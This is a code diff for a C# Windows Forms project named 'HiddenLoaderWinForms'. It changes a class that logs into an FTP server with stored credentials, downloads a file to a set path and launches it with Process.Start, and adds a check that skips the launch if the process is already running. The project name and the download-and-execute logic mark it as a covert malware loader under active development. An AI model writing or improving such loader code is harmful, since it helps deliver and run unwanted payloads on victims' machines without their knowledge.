@@ -3,34 +3,35 @@ using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace HiddenLoaderWinForms.Download
 {
     public class FtpDonwload
     {
         private static string _ftpUsername;
-        private static string _ftpPassowrd;
+        private static string _ftpPassword;
         private static string _ftpAddress;
 
         public static void Setup(string user, string password, string address)
         {
             _ftpUsername = user;
-            _ftpPassowrd = password;
+            _ftpPassword = password;
             _ftpAddress = address;
         }
 
         public static void Download()
         {
-            if (_ftpUsername != string.Empty & _ftpPassowrd != string.Empty & _ftpAddress != string.Empty)
+            if (_ftpUsername != string.Empty & _ftpPassword != string.Empty & _ftpAddress != string.Empty)
             {
                 try
                 {
                     FtpWebRequest request = (FtpWebRequest)WebRequest.Create(_ftpAddress); //creating ftp web request
                     request.Method = WebRequestMethods.Ftp.DownloadFile; // select request method
-                    request.Credentials = new NetworkCredential(_ftpUsername, _ftpPassowrd); //initialize user for web request
+                    request.Credentials = new NetworkCredential(_ftpUsername, _ftpPassword); //initialize user for web request
                     FtpWebResponse response = (FtpWebResponse)request.GetResponse(); 
                     Stream responseStream = response.GetResponseStream();
-                    FileStream file = File.Create(Config.DownloadPathDir); //creating file in download directory from Config.cs 
+                    FileStream file = File.Create(Config.DownloadPathDir); //creating file
                     byte[] bufferSize = new byte[512 * 1024]; //set buffer size
                     int read;
                     while (responseStream != null && (read = responseStream.Read(bufferSize, 0, bufferSize.Length)) > 0)
@@ -56,9 +57,13 @@ namespace HiddenLoaderWinForms.Download
         {
             try
             {
-                if (File.Exists(Config.RunProcessFileDir))
+                if (File.Exists(Config.DownloadPathDir))
                 {
-                    Process.Start(Config.RunProcessFileDir); //run downloaded file from directory from Config.cs
+                    MessageBox.Show(Config.DownloadPathDir);
+                    if (Process.GetProcessesByName(Config.FileName).Length == 0) //check on exist process
+                    {
+                        Process.Start(Config.DownloadPathDir); //run downloaded file
+                    }
                 }
                 else
                 {
